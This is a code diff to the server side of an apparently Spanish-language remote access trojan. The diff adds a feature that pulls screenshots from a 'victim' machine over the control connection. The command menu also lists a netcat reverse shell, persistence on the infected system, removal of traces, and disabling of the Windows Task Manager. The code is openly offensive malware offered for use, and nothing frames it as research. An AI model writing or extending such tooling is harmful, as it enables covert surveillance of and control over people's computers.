@@ -270,7 +270,7 @@ class Server(Thread):
 		else:
 		 	print("\n [\033[1;31mx\033[0;39m] No hay personas capturadas\n")
 
-		return
+		return lista_terricolas_table
 
 
 
@@ -449,6 +449,29 @@ class Control():
 
 
 	def screenshot(self):
+
+		# Envia y recibe mensaje del modo a utilizar
+		self.servidor.enviar(self.objetivo,"screenshot")
+		self.servidor.recibir(self.objetivo)
+
+		if not os.path.isdir("screenshots"):
+			os.mkdir("screenshots")
+
+		self.servidor.enviar(self.objetivo,"nombre")
+		nombre_archivo = self.servidor.recibir(self.objetivo)
+
+		self.servidor.enviar(self.objetivo,'size')
+		size = int(self.servidor.recibir(self.objetivo))
+
+		with open("screenshots/"+nombre_archivo,"wb") as archivo:
+			while (size>0):
+				contenido = self.objetivo.recv(1024)
+				archivo.write(contenido)
+				size-=len(contenido)
+
+
+		print (" [\033[1;32m+\033[0;39m] La captura se guardo en: screenshots/"+nombre_archivo)
+
 		return
 
 
@@ -660,6 +683,7 @@ def manipular(servidor,cliente):
 	"netcat" : ["netcat","Utiliza netcat para obtener un shell inversa"],
 	"persistencia" : ["persistence","Implantar bicho en el cerebro victima"],
 	"autoremover" : ["autoremove","Elimina rastro del bicho en el sisetma infectado"],
+	"screenshot" : ["screenshot","Saca una captura de pantalla del equipo victima"],
 	"taskmgr_disable" : ["taskmgr_disable","Deshabilita el administrador de tareas de Windows"]
 
 	}
@@ -714,6 +738,9 @@ def manipular(servidor,cliente):
 
 		elif (victima=="autoremover"):
 			control.autoremoverse()
+
+		elif (victima=="screenshot"):
+			control.screenshot()
 
 		elif (victima=="taskmgr_disable"):
 			control.deshabilitar_TaskManager()
@@ -817,7 +844,6 @@ def laboratorio(servidor):
 					
 					if (cliente < len(servidor.terricolas)) and (cliente>=0):
 						servidor.matar_terricola(cliente)
-						lista_terricolas_table.pop(cliente)
 						print("\n [\033[1;34m*\033[0;39m] " + ataques() + "\n")
 					else:
 						print (" \n [\033[1;31mx\033[0;39m] No existe el terricola indicado...\n");
